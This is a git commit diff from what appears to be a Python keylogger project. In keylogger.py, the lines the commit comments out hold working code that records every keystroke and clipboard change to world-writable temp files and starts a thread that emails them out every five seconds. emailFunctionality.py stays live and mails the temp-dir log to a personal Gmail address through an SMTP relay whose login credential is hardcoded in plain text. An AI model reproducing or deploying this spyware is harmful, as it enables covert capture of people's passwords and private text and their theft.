a999f50d14bc0ba00105a57295b92184a90fa544
Ursh <ukharbanda20@gmail.com>
2024-11-02 21:45:58 +1100

    dodgy email

--- emailFunctionality.py
+++ emailFunctionality.py
@@ -1,46 +1,91 @@
 
-import smtplib
-from email.message import EmailMessage
+# import smtplib
+# from email.message import EmailMessage
 import os
-import ctypes
-# from keylogger import hide
-# from keylogger import unhide 
-from encryption import encryptContents 
+# import ctypes
+# # from keylogger import hide
+# # from keylogger import unhide 
+# from encryption import encryptContents 
+import tempfile
+
+# log_file = "logs.txt"
+# # clipBoard_file = "clipBoardLogs.txt"
+# # blog_file = "logs.bin"
+# # bclipBoard_file = "clipBoardLogs.bin"
+
+# def sendEmail():
+#     print("sending")
+
+#     # nlog_file = encryptContents("logs.txt")
+#     # print(nlog_file)
+#     # nclipBoard_file = encryptContents("clipBoardLogs.txt")
+#     # print(nclipBoard_file)
+#     sender = "hello@demomailtrap.com"
+#     receiver = "ukharbanda20@gmail.com"
+#     message = EmailMessage()
+#     message["Subject"] = "Hi Mailtrap"
+#     message["From"] = sender
+#     message["To"] = receiver
+#     message.set_content("hi ursh.")
+#     try:
+#         with open(log_file, "r") as file:
+#             fileData = file.read()
+#             message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
+#         # with open(log_file, "rb") as file:
+#         #     fileData = file.read()
+#         #     message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
+#         # with open(clipBoard_file, "rb") as clipBoardFile:
+#         #     clipBoardFileData = clipBoardFile.read()
+#         #     message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")
+
+#         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
+#             server.starttls()
+#             server.login("api", "c2151af737bd447f8f82331e58edbda8")
+#             server.send_message(message)
+#         print("Email sent successfully!")
+    
+
+#     except smtplib.SMTPDataError as e:
+#         print("SMTP Data Error:", e)
+#     except smtplib.SMTPException as e:
+#         print("SMTP Error:", e)
+#     except Exception as e:
+#         print("General Error:", e)
+    
+
+# if __name__ == "__main__":
+#     sendEmail()
+
+    
+
+
+from email.message import EmailMessage
+import smtplib
 
 log_file = "logs.txt"
-clipBoard_file = "clipBoardLogs.txt"
-blog_file = "logs.bin"
-bclipBoard_file = "clipBoardLogs.bin"
-
+log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')
 def sendEmail():
     print("sending")
 
-    nlog_file = encryptContents("logs.txt")
-    print(nlog_file)
-    nclipBoard_file = encryptContents("clipBoardLogs.txt")
-    print(nclipBoard_file)
     sender = "hello@demomailtrap.com"
     receiver = "ukharbanda20@gmail.com"
     message = EmailMessage()
     message["Subject"] = "Hi Mailtrap"
     message["From"] = sender
     message["To"] = receiver
-    message.set_content("Please find the logs attached.")
-    try:
+    message.set_content("hi ursh.")
 
-        with open(log_file, "rb") as file:
+    try:
+        with open(log_file, "r") as file:
             fileData = file.read()
-            message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
-        with open(clipBoard_file, "rb") as clipBoardFile:
-            clipBoardFileData = clipBoardFile.read()
-            message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")
+            message.add_attachment(fileData.encode(), maintype="text", subtype="plain", filename="logs.txt")
 
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
             server.login("api", "c2151af737bd447f8f82331e58edbda8")
             server.send_message(message)
+
         print("Email sent successfully!")
-    
 
     except smtplib.SMTPDataError as e:
         print("SMTP Data Error:", e)
@@ -48,11 +93,6 @@ def sendEmail():
         print("SMTP Error:", e)
     except Exception as e:
         print("General Error:", e)
-    
 
 if __name__ == "__main__":
     sendEmail()
-
-    
-
-
--- keylogger.py
+++ keylogger.py
@@ -1,140 +1,140 @@
-import atexit
-import os
-import stat
-import threading
-import time
-from datetime import datetime 
-from pynput import keyboard
-import pyperclip
-from threading import Thread
-import ctypes
+# import atexit
+# import os
+# import stat
+# import threading
+# import time
+# from datetime import datetime 
+# from pynput import keyboard
+# import pyperclip
+# from threading import Thread
+# import ctypes
 from emailFunctionality import sendEmail
-from encryption import encryptContents 
-import tempfile
+# from encryption import encryptContents 
+# import tempfile
 
-ThreadRunning = True
-log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')
+# ThreadRunning = True
+# log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')
 
-# log_file = "logs.txt"
-clipBoard_file = "clipBoardLogs.txt"
-clipBoard_file = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.txt')
-
-
-logBin = os.path.join(tempfile.gettempdir(), 'logs.bin')
-
-# log_file = "logs.txt"
-clipBin = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.bin')
-
-try:
-    os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
-    print(f"Permissions for {log_file} changed successfully.")
-except PermissionError:
-    print(f"Permission denied: Unable to change permissions for {log_file}.")
-except FileNotFoundError:
-    print(f"File not found: {log_file} does not exist.")
-except Exception as e:
-    print(f"An error occurred: {e}")
+# # log_file = "logs.txt"
+# clipBoard_file = "clipBoardLogs.txt"
+# clipBoard_file = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.txt')
 
 
-try:
-    os.chmod(clipBoard_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
-    print(f"Permissions for {log_file} changed successfully.")
-except PermissionError:
-    print(f"Permission denied: Unable to change permissions for {log_file}.")
-except FileNotFoundError:
-    print(f"File not found: {log_file} does not exist.")
-except Exception as e:
-    print(f"An error occurred: {e}")
+# logBin = os.path.join(tempfile.gettempdir(), 'logs.bin')
 
-try:
-    os.chmod(logBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
-    print(f"Permissions for {logBin} changed successfully.")
-except PermissionError:
-    print(f"Permission denied: Unable to change permissions for {logBin}.")
-except FileNotFoundError:
-    print(f"File not found: {logBin} does not exist.")
-except Exception as e:
-    print(f"An error occurred: {e}")
+# # log_file = "logs.txt"
+# clipBin = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.bin')
+
+# try:
+#     os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+#     print(f"Permissions for {log_file} changed successfully.")
+# except PermissionError:
+#     print(f"Permission denied: Unable to change permissions for {log_file}.")
+# except FileNotFoundError:
+#     print(f"File not found: {log_file} does not exist.")
+# except Exception as e:
+#     print(f"An error occurred: {e}")
 
 
-try:
-    os.chmod(clipBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
-    print(f"Permissions for {clipBin} changed successfully.")
-except PermissionError:
-    print(f"Permission denied: Unable to change permissions for {clipBin}.")
-except FileNotFoundError:
-    print(f"File not found: {clipBin} does not exist.")
-except Exception as e:
-    print(f"An error occurred: {e}")
+# try:
+#     os.chmod(clipBoard_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+#     print(f"Permissions for {log_file} changed successfully.")
+# except PermissionError:
+#     print(f"Permission denied: Unable to change permissions for {log_file}.")
+# except FileNotFoundError:
+#     print(f"File not found: {log_file} does not exist.")
+# except Exception as e:
+#     print(f"An error occurred: {e}")
+
+# try:
+#     os.chmod(logBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+#     print(f"Permissions for {logBin} changed successfully.")
+# except PermissionError:
+#     print(f"Permission denied: Unable to change permissions for {logBin}.")
+# except FileNotFoundError:
+#     print(f"File not found: {logBin} does not exist.")
+# except Exception as e:
+#     print(f"An error occurred: {e}")
+
+
+# try:
+#     os.chmod(clipBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+#     print(f"Permissions for {clipBin} changed successfully.")
+# except PermissionError:
+#     print(f"Permission denied: Unable to change permissions for {clipBin}.")
+# except FileNotFoundError:
+#     print(f"File not found: {clipBin} does not exist.")
+# except Exception as e:
+#     print(f"An error occurred: {e}")
 
 
 
-with open(log_file, "w"):
-    pass
+# with open(log_file, "w"):
+#     pass
 
-with open(clipBoard_file, "w"):
-    pass
-def on_press(key):
-    global ThreadRunning
-    if key == keyboard.Key.esc:
-        print("escape")
-        ThreadRunning = False
-        return False  
+# with open(clipBoard_file, "w"):
+#     pass
+# def on_press(key):
+#     global ThreadRunning
+#     if key == keyboard.Key.esc:
+#         print("escape")
+#         ThreadRunning = False
+#         return False  
     
-    keyPressed = returnKeyType(key)
+#     keyPressed = returnKeyType(key)
 
-    with open(log_file, "a") as keyLogs:
-        keyLogs.write(parseOutput(keyPressed))
+#     with open(log_file, "a") as keyLogs:
+#         keyLogs.write(parseOutput(keyPressed))
 
-def returnKeyType(key):
-    try:
-        keyPressed = key.char
-    except AttributeError:
-        keyPressed = key.name
+# def returnKeyType(key):
+#     try:
+#         keyPressed = key.char
+#     except AttributeError:
+#         keyPressed = key.name
 
-    return keyPressed
+#     return keyPressed
 
-def parseOutput(keyPressed):
-    currTime = datetime.now()
-    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
-    keyPressed = keyPressed + "     " + currTimeString + "\n"
-    return keyPressed
+# def parseOutput(keyPressed):
+#     currTime = datetime.now()
+#     currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
+#     keyPressed = keyPressed + "     " + currTimeString + "\n"
+#     return keyPressed
 
-def checkClipBoard():
-    prevContent = None
+# def checkClipBoard():
+#     prevContent = None
 
-    while ThreadRunning:
-        currContent = pyperclip.paste()
-        if currContent != prevContent:
-            prevContent = currContent
+#     while ThreadRunning:
+#         currContent = pyperclip.paste()
+#         if currContent != prevContent:
+#             prevContent = currContent
 
-        with open(clipBoard_file, "a") as clipBoardKeyLogs:
-            clipBoardKeyLogs.write(parseOutput(prevContent))
-        time.sleep(1)
+#         with open(clipBoard_file, "a") as clipBoardKeyLogs:
+#             clipBoardKeyLogs.write(parseOutput(prevContent))
+#         time.sleep(1)
     
-def sendToEmail():
+# def sendToEmail():
 
-    while ThreadRunning:
+#     while ThreadRunning:
 
-        sendEmail()
-        time.sleep(5)
+#         sendEmail()
+#         time.sleep(5)
 
-    return
+#     return
 
 if __name__ == "__main__":
-    try: 
-        listener = keyboard.Listener(on_press=on_press)
-        checkClipBoardThread = threading.Thread(target=checkClipBoard)
-        checkClipBoardThread.daemon = True
-        checkClipBoardThread.start()
+    # try: 
+    #     listener = keyboard.Listener(on_press=on_press)
+    #     checkClipBoardThread = threading.Thread(target=checkClipBoard)
+    #     checkClipBoardThread.daemon = True
+    #     checkClipBoardThread.start()
 
-        sendEmailThread = threading.Thread(target=sendToEmail)
-        sendEmailThread.daemon = True
-        sendEmailThread.start()
+    #     sendEmailThread = threading.Thread(target=sendToEmail)
+    #     sendEmailThread.daemon = True
+    #     sendEmailThread.start()
 
-        listener.start() 
-        listener.join()
+    #     listener.start() 
+    #     listener.join()
 
-    except KeyboardInterrupt:
-        ThreadRunning = False
-        
+    # except KeyboardInterrupt:
+    #     ThreadRunning = False
+    sendEmail()
